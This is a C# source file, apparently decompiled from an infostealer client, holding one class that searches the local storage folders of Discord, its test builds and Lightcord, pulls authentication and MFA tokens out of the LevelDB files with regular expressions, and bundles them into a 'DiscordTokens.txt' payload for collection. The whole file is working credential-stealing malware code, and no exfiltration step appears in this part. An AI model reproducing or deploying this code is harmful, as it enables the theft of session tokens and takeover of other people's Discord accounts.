using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using client.Helpers;
using client.Models;

namespace client.Body
{
	// Token: 0x02000040 RID: 64
	internal class Discord
	{
		// Token: 0x0600018A RID: 394 RVA: 0x0000885C File Offset: 0x00006A5C
		public static DefaultFileStructure Get()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			List<string> list = new List<string>();
			list.Add(folderPath + "\\discord");
			list.Add(folderPath + "\\discordcanary");
			list.Add(folderPath + "\\discordptb");
			list.Add(folderPath + "\\discorddevelopment");
			list.Add(folderPath + "\\Lightcord");
			List<string> list2 = new List<string>();
			foreach (string str in list)
			{
				string path = str + "\\Local Storage\\leveldb";
				if (Directory.Exists(path))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles("*.ldb".Replace("_", null)))
					{
						try
						{
							string input = fileInfo.OpenText().ReadToEnd();
							foreach (object obj in Regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}"))
							{
								Match match = (Match)obj;
								list2.Add(match.Value);
							}
							foreach (object obj2 in Regex.Matches(input, "mfa\\.[\\w-]{84}"))
							{
								Match match2 = (Match)obj2;
								list2.Add(match2.Value);
							}
						}
						catch (Exception e)
						{
							LoggerHelper.HandleRuntimeError(e);
						}
					}
				}
			}
			list2 = list2.Distinct<string>().ToList<string>();
			if (list2.Count > 0)
			{
				return new DefaultFileStructure
				{
					Service = DataType.Discord,
					FileName = "DiscordTokens.txt",
					FileContent = Encoding.UTF8.GetBytes(string.Join("\n", list2))
				};
			}
			return null;
		}
	}
}
